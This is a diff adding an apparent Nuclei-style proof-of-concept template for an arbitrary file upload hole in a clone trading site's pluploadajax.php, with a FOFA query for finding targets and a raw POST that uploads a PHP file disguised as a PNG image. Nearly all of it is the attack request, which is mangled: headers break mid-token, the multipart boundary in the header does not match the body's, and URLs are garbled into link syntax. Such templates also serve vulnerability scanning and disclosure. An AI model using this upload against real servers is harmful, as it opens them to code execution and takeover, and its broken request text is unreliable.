@@ -1,0 +1,99 @@
+id: poc-ox534yl9zuzd9b19
+info:
+  name: 仿转转交易猫⼗六合⼀⾃带客服系统pluploadajax存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ox534yl9zuzd9b19'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ox534yl9zuzd9b19
+    fofa: 'header="Location: [http://www.baidu.com"](http://www.baidu.com%22) && header="Cache-Control: no-store, no'
+http:
+- raw:
+  - 'POST /wuyun/pluploadajax.php HTTP/1.1
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,i
+
+    mage/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br, zstd
+
+    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
+
+    Cache-Control: max-age=0
+
+    Connection: keep-alive
+
+    Content-Length: 198
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylEvfENhB
+
+    9EVsJApl
+
+    Cookie: Aname=wuyun; deviceid=1708223329907; rockkefu_deviceid=17082404095
+
+    82; BJYADMIN=7ovdcsf3httsj0r6fbu10mk7l2; adminToken=a66abb5684c45962d88756
+
+    4f08346e8d; userName=test; userToken=05a671c66aefea124cc08b76ea6d30bb; use
+
+    rname=mstir; passid=l5no2rmjhs4g824ry6wymx104j5dy5y24w4utq0w25mfzh34comxj8
+
+    gpg02xnr5t; bbs_token=Z8NDY3CV5JTOuj7RkvnIbyzQZsstjYWW8KV1SA_3D_3D; PHPSES
+
+    SID=bbd30367d9c0c0261b13b63f00ee3a3f; mysid=85817cf2ad20d5d73ecbb49c85d4b4
+
+    32; counter=1; vfm_1970646931=0cgkajqj3eai8i0uru3r25u823; scdb2fb5b=vhg123
+
+    s7fjuvsjm0he1tfphkj6; ctcms_ctcms_uid=6b5eYtl6HyOijGDycjEGDX4onD5o1JXOP_3t
+
+    Y3NF; ctcms_ctcms_log=001bz5-hHo5XAymV3mrIaeOCfbt1fCrL-FlYt4fI-vKwpL2PPC_j
+
+    Rkqd-E9-o6v-wb53W3BQay5x7TgMsw; __51cke__=; __tins__20885247=%7B%22sid%22%
+
+    3A%201711286028126%2C%20%22vd%22%3A%204%2C%20%22expires%22%3A%201711288044
+
+    808%7D; __51laig__=4
+
+    Host: {{Hostname}}
+
+    Origin: [http://127.0.0.1](http://127.0.0.1)
+
+    Referer: [http://127.0.0.1/wuyun/pluploadajax.php](http://127.0.0.1/wuyun/pluploadajax.php)
+
+    Sec-Fetch-Dest: document
+
+    Sec-Fetch-Mode: navigate
+
+    Sec-Fetch-Site: none
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (
+
+    KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
+
+    sec-ch-ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="12
+
+    3"
+
+    sec-ch-ua-mobile: ?0
+
+    sec-ch-ua-platform: "Windows"
+
+    sec-fetch-user: ?1
+
+    ------WebKitFormBoundaryzs9uzC8QeHUNQ3YS
+
+    Content-Disposition: form-data; name="file"; filename="aaa.php"
+
+    Content-Type: image/png
+
+    <?php phpinfo();?>
+
+    ------WebKitFormBoundaryzs9uzC8QeHUNQ3YS--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
